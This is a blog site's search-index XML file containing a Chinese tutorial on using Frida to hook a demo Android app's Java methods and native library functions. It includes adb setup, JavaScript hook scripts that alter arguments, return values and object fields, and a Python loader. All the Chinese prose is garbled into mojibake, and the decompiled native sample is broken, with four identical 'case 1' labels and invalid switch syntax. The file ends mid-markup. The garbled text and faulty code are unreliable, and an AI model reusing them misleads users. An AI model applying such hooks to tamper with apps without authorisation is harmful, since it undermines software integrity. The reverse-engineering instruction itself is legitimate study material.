<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hook Framework</title>
      <link href="2021/03/15/Hook%E6%A1%86%E6%9E%B6/"/>
      <url>2021/03/15/Hook%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p>æˆªè·æ¶ˆæ¯ï¼Œè·å¾—æ§åˆ¶æƒã€‚<span id="more"></span></p><p>HOOKæ¡†æ¶æ˜¯ä¸€ç§Androidé€†å‘æŠ€æœ¯ã€‚åœ¨ç³»ç»Ÿæ²¡æœ‰è°ƒç”¨è¯¥å‡½æ•°ä¹‹å‰ï¼ŒHookå°±å…ˆæ•è·è¯¥æ¶ˆæ¯ï¼ŒHookå‡½æ•°å…ˆå¾—åˆ°æ§åˆ¶æƒï¼Œè¿™æ—¶Hookå‡½æ•°æ—¢å¯ä»¥ä¿®æ”¹ç¨‹åºæ‰§è¡Œé€»è¾‘ï¼Œæ”¹å˜å‚æ•°è¿”å›å€¼ï¼Œè¿˜å¯ä»¥å¼ºåˆ¶ç»“æŸæ¶ˆæ¯çš„ä¼ é€’ã€‚æœ¬æ–‡ä»‹ç»å¸¸ç”¨çš„ä¸¤ç§ã€‚</p><h1 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h1><p>Fridaæ˜¯åŸºäºJavaScriptå’Œpythonçš„ï¼Œå¯ä»¥å®ç°å¯¹androidç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•çš„å·¥å…·åŒ…ï¼Œå¯ä»¥ç”¨äºä¸‹åˆ—ç”¨é€”ï¼š</p><ul><li>è®¿é—®è¿›ç¨‹çš„å†…å­˜</li><li>åº”ç”¨ç¨‹åºè¿è¡Œæ—¶è¦†ç›–åŠŸèƒ½</li><li>ä»å¯¼å…¥çš„ç±»è°ƒç”¨å‡½æ•°</li><li>åŠ¨æ€Hookè·Ÿè¸ªã€æ‹¦æˆªå‡½æ•°</li><li>åœ¨å †ä¸ŠæŸ¥æ‰¾å¯¹è±¡å®ä¾‹å¹¶ä½¿ç”¨è¿™äº›å¯¹è±¡å®ä¾‹</li></ul><p>Fridaçš„æœ¬è´¨æ˜¯ç»™äºŒè¿›åˆ¶æ–‡ä»¶æ’æ¡©ï¼Œç”¨å®‰å“åº”ç”¨ä¸¾ä¾‹ï¼šåœ¨æ‰‹æœºä¸Šè¿è¡Œfrida_serverå¹¶ä¸”è½¬å‘ç«¯å£åˆ°PCç«¯ï¼ŒPCç«¯åˆåˆ©ç”¨pythonä»£ç ä¸serverè¿›è¡Œé€šä¿¡ï¼Œå¹¶ç”¨JavaScriptå¯¹äºæ­£åœ¨æ‰§è¡Œçš„è¿›ç¨‹è¿›è¡Œæ³¨å…¥ï¼Œè¾¾åˆ°å†…å­˜è®¿é—®çš„ç›®çš„ã€‚å¦‚å›¾ï¼š</p><img src="https://z3.ax1x.com/2021/03/25/6LUVsI.png" class="lazyload" data-srcset="https://z3.ax1x.com/2021/03/25/6LUVsI.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 67%;" /><p>æœ¬æ–‡å¯¹ç¤ºä¾‹çš„ä¸¤ä¸ªapkåˆ†åˆ«è¿›è¡Œjavaå±‚å’Œnativeå±‚çš„hookè°ƒè¯•ã€‚</p><h2 id="Javaå±‚"><a href="#Javaå±‚" class="headerlink" title="Javaå±‚"></a>Javaå±‚</h2><h3 id="1-æ‰‹æœºç«¯ç¯å¢ƒé…ç½®"><a href="#1-æ‰‹æœºç«¯ç¯å¢ƒé…ç½®" class="headerlink" title="1.æ‰‹æœºç«¯ç¯å¢ƒé…ç½®"></a>1.æ‰‹æœºç«¯ç¯å¢ƒé…ç½®</h3><ul><li>ä¸‹è½½<a href="https://github.com/frida/frida/releases">frida_server</a>å¹¶pushè‡³æ‰‹æœºä¸­</li><li>adb shellä¸­è¿è¡Œï¼Œå¹¶è½¬å‘ç«¯å£(é»˜è®¤ç«¯å£ä¸º27042)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br></pre></td></tr></table></figure><h3 id="2-Java-ä»£ç åˆ†æ"><a href="#2-Java-ä»£ç åˆ†æ" class="headerlink" title="2.Java ä»£ç åˆ†æ"></a>2.Java ä»£ç åˆ†æ</h3><p>demoä¸­éœ€è¦åˆ†æçš„ä»£ç æ®µå¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//In MainActivity:</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg6)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span>(arg6.getId()) &#123;</span><br><span class="line"><span class="comment">//Button 1</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2131230720</span>: &#123;</span><br><span class="line">      Toast.makeText(<span class="keyword">this</span>.getApplication(), <span class="keyword">new</span> StringBuilder(String.valueOf(Utils.getCalc(<span class="number">2000</span>, <span class="number">5000</span>))).toString(), <span class="number">1</span>).show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//Button 2</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2131230721</span>: &#123;</span><br><span class="line">      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.getMoney().getInfo(), <span class="number">1</span>).show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//Button 3</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2131230722</span>: &#123;</span><br><span class="line">      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.test(<span class="number">0x7CB8</span>), <span class="number">1</span>).show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//Button 4</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2131230723</span>: &#123;</span><br><span class="line">      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.test(), <span class="number">1</span>).show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//Button 5</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2131230724</span>: &#123;</span><br><span class="line">      Toast.makeText(<span class="keyword">this</span>.getApplication(), Utils.test(), <span class="number">1</span>).show();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­äº”ä¸ªButtonåˆ†åˆ«å¯¹åº”äº†å¦‚ä¸‹äº”ç§å‡½æ•°ç±»å‹ã€‚å…¶Javaä»£ç åŠJavaScriptæ³¨å…¥è„šæœ¬å¦‚ä¸‹ï¼š</p><p><strong>Button 1:æ™®é€šæ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">getCalc</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> arg1 + arg2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ğŸ‘‡</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//é€šè¿‡Java.use()æ‰¾åˆ°éœ€è¦hookçš„javaç±»ä¸ºå˜é‡åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line"><span class="comment">//ä¸ºutilç±»ä¸­çš„getCalcæ–¹æ³•ç¼–å†™hookè„šæœ¬ï¼šå‚æ•°ä¸ºa,b</span></span><br><span class="line">    utils.getCalc.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line"><span class="comment">//logæ–¹å¼è¾“å‡º</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line"><span class="comment">//ç»ˆç«¯æ–¹å¼è¾“å‡ºï¼Œåˆ†åˆ«è¾“å‡ºJavaå±‚ä¸­ç»™getCalcå‡½æ•°ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°</span></span><br><span class="line">send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    send(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">send(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> num=<span class="built_in">arguments</span>[<span class="number">0</span>]+<span class="built_in">arguments</span>[<span class="number">1</span>];</span><br><span class="line">send(<span class="string">&quot;è¿”å›å€¼:&quot;</span>);</span><br><span class="line">send(num);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.getCalc(<span class="built_in">arguments</span>[<span class="number">0</span>],<span class="built_in">arguments</span>[<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Button 2:æ„é€ æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Money</span><span class="params">(<span class="keyword">int</span> arg1, String arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.num = arg1;</span><br><span class="line">    <span class="keyword">this</span>.name = arg2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ğŸ‘‡</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> money = Java.use(<span class="string">&#x27;com.frida.test.Money&#x27;</span>);</span><br><span class="line"><span class="comment">//&quot;$init&quot;è¡¨ç¤ºmoneyç±»çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    money.$init.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">send(<span class="built_in">arguments</span>[<span class="number">1</span>]);</span><br><span class="line">    send(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line"><span class="comment">//åŸä¼ å…¥å‚æ•°ä¸º:100,&quot;RMB&quot;</span></span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.$init(<span class="number">10000</span>, <span class="string">&quot;Dollor&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Button 3:é‡è½½æ–¹æ³•</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">(<span class="keyword">int</span> arg2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Test string 2:&quot;</span> + arg2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;This is a test string&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ğŸ‘‡</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line"><span class="comment">//ç»‘å®šå‚æ•°ç±»å‹ä¸º(int)çš„testé‡è½½å‡½æ•°</span></span><br><span class="line">    utils.test.overload(<span class="string">&quot;int&quot;</span>).implementation = <span class="function"><span class="keyword">function</span> (<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line">send(<span class="built_in">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">    send(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;3.1415926&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>Button4ã€5</strong>åœ¨javaå±‚ä¸­è°ƒç”¨äº†ç›¸åŒçš„å‡½æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;This is a test string&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é€šè¿‡æ³¨å…¥ä¸åŒçš„Javascripè„šæœ¬å®ç°å¦‚ä¸‹çš„ä¸åŒåŠŸèƒ½ã€‚</p><p><strong>æ„é€ å¯¹è±¡å‚æ•°</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">//æ­¤å¤„æ„é€ ä¸¤ä¸ªæ–°å¯¹è±¡</span></span><br><span class="line"><span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> money = Java.use(<span class="string">&#x27;com.frida.test.Money&#x27;</span>);</span><br><span class="line"><span class="comment">//testå‡½æ•°ä½œä¸ºè½½ä½“</span></span><br><span class="line">  utils.test.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    send(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line"><span class="comment">//åŠ«æŒç¨‹åºæ‰§è¡Œæ–°å¯¹è±¡çš„æ„é€ å‡½æ•°</span></span><br><span class="line"><span class="keyword">var</span> mon = money.$new(<span class="number">2000</span>,<span class="string">&#x27;æ¸¯å¸&#x27;</span>);</span><br><span class="line">send(mon.getInfo());</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.test(<span class="number">800</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>ä¿®æ”¹å¯¹è±¡å±æ€§</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> utils = Java.use(<span class="string">&#x27;com.frida.test.Utils&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> money = Java.use(<span class="string">&#x27;com.frida.test.Money&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="class"><span class="keyword">class</span> </span>= Java.use(<span class="string">&#x27;java.lang.Class&#x27;</span>);</span><br><span class="line">  utils.test.overload().implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  send(<span class="string">&quot;Hook Start...&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> mon = money.$new(<span class="number">200</span>,<span class="string">&#x27;æ¸¯å¸&#x27;</span>);</span><br><span class="line">send(mon.getInfo());</span><br><span class="line"><span class="comment">//å°†å˜é‡ç»‘å®šä¸ºmoneyå¯¹è±¡çš„numå±æ€§</span></span><br><span class="line"><span class="keyword">var</span> numid= Java.cast(mon.getClass(),<span class="class"><span class="keyword">class</span>).<span class="title">getDeclaredField</span>(&#x27;<span class="title">num</span>&#x27;)</span>;</span><br><span class="line"><span class="comment">//å°†å˜é‡è®¾ä¸ºå¯ä¿®æ”¹</span></span><br><span class="line">numid.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  send(numid.get(mon));</span><br><span class="line"><span class="comment">//ä¿®æ”¹</span></span><br><span class="line">  numid.setInt(mon, <span class="number">1000</span>);</span><br><span class="line">  send(mon.getInfo());</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.test(<span class="number">800</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¸Šè¿°JavaScriptè„šæœ¬å‡éœ€è¦æ’å…¥åˆ°pythonä»£ç ä¸­ä»¥è¿è¡Œä½¿ç”¨ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">jscode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">æ­¤å¤„æ’å…¥jsä»£ç ï¼Œç”¨ä¸‰å¼•å·åŒ…å›´</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">message</span>(<span class="params">message, data</span>):</span></span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&#x27;send&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(message[<span class="string">&#x27;payload&#x27;</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">process = frida.get_remote_device().attach(<span class="string">&#x27;com.frida.test&#x27;</span>)</span><br><span class="line">script= process.create_script(jscode)</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><h2 id="Nativeå±‚"><a href="#Nativeå±‚" class="headerlink" title="Nativeå±‚"></a>Nativeå±‚</h2><p>soå±‚ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __fastcall Java_com_example_fridaso_FridaSoDefine_FridaSo(<span class="built_in">int</span> a1, <span class="built_in">int</span> a2, <span class="built_in">int</span> a3, <span class="built_in">int</span> a4ï¼Œ<span class="built_in">int</span> a5)</span><br><span class="line">&#123;</span><br><span class="line">switch(a5):</span><br><span class="line">case <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">return</span> a4 + a3;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">case <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">return</span> a3 - a4;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">case <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">return</span> a4 * a3;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">case <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">return</span> a3 / a4;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">default:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Javascriptè„šæœ¬ï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//setImmediateåŒ…å›´ï¼Œå¯é˜²æ­¢è¶…æ—¶æŠ¥é”™</span></span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    send(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//éå†æ¨¡å—æ‰¾åŸºå€</span></span><br><span class="line">    Process.enumerateModules(&#123;</span><br><span class="line">        onMatch: <span class="function"><span class="keyword">function</span> (<span class="params">exp</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (exp.name == <span class="string">&#x27;libdemo.so&#x27;</span>) &#123;</span><br><span class="line">                send(<span class="string">&#x27;enumerateModules find&#x27;</span>);</span><br><span class="line">                send(exp.name + <span class="string">&quot;|&quot;</span> + exp.base + <span class="string">&quot;|&quot;</span> + exp.size + <span class="string">&quot;|&quot;</span> + exp.path);</span><br><span class="line">                send(exp);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;stop&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            send(<span class="string">&#x27;enumerateModules stop&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//hookå¯¼å‡ºå‡½æ•°</span></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">exports</span> = Module.enumerateExportsSync(<span class="string">&quot;libdemo.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="built_in">exports</span>.length;i++)&#123;</span><br><span class="line">        send(<span class="string">&quot;name:&quot;</span>+<span class="built_in">exports</span>[i].name+<span class="string">&quot;  address:&quot;</span>+<span class="built_in">exports</span>[i].address);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//é€šè¿‡æ¨¡å—åç›´æ¥æŸ¥æ‰¾åŸºå€</span></span><br><span class="line">    <span class="keyword">var</span> baseSOFile = Module.findBaseAddress(<span class="string">&quot;libdemo.so&quot;</span>);</span><br><span class="line">    <span class="comment">//&quot;Interceptor.attach&quot;è·å–è¿›ç¨‹ï¼Œæ­¤å¤„è‹¥ä¸ºthumbæ±‡ç¼–åˆ™éœ€è¦æ”¹æˆ0x1270+1</span></span><br><span class="line">    Interceptor.attach(baseSOFile.add(<span class="number">0x00001270</span>),&#123;</span><br><span class="line">        onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line"><span class="comment">//å‚æ•°1ä¸ºJNIEnv *</span></span><br><span class="line">            <span class="built_in">console</span>.log(Memory.readCString(args[<span class="number">0</span>]));</span><br><span class="line"><span class="comment">//å‚æ•°2ä¸ºjclass</span></span><br><span class="line">            <span class="built_in">console</span>.log(Memory.readUtf16String(args[<span class="number">3</span>]));</span><br><span class="line">            <span class="built_in">console</span>.log(args[<span class="number">2</span>]);</span><br><span class="line">            <span class="built_in">console</span>.log(args[<span class="number">3</span>]);</span><br><span class="line">            <span class="built_in">console</span>.log(args[<span class="number">4</span>]);</span><br><span class="line">        &#125;,</span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//é€šè¿‡åŒ…åç±»åå‡½æ•°åæ‰¾åˆ°åŸºå€è·å–ç¨‹åºè¿›ç¨‹</span></span><br><span class="line">Interceptor.attach(Module.findExportByName(<span class="string">&quot;libfridaso.so&quot;</span>,<span class="string">&quot;Java_com_example_fridaso_FridaSoDefine_FridaSo&quot;</span>),&#123;</span><br><span class="line">        <span class="comment">//onEnteråœ¨å‡½æ•°æ‰§è¡Œå‰æ‰§è¡Œï¼Œargsæ˜¯å‡½å‚</span></span><br><span class="line">onEnter: <span class="function"><span class="keyword">function</span>(<span class="params">args</span>) </span>&#123;</span><br><span class="line">            send(<span class="string">&quot;Hook start&quot;</span>);</span><br><span class="line">            send(<span class="string">&quot;args[2]=&quot;</span> + args[<span class="number">2</span>]);</span><br><span class="line">            send(<span class="string">&quot;args[3]=&quot;</span> + args[<span class="number">3</span>]);</span><br><span class="line">        &#125;,</span><br><span class="line"><span class="comment">//onLeaveåœ¨å‡½æ•°æ‰§è¡Œç»“æŸåæ‰§è¡Œï¼Œretvalæ˜¯è¿”å›å€¼</span></span><br><span class="line">        onLeave: <span class="function"><span class="keyword">function</span>(<span class="params">retval</span>)</span>&#123;</span><br><span class="line">            send(<span class="string">&quot;return:&quot;</span>+retval); </span><br><span class="line">            retval.replace(<span class="number">0</span>); <span class="comment">//æ›¿æ¢è¿”å›å€¼</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span 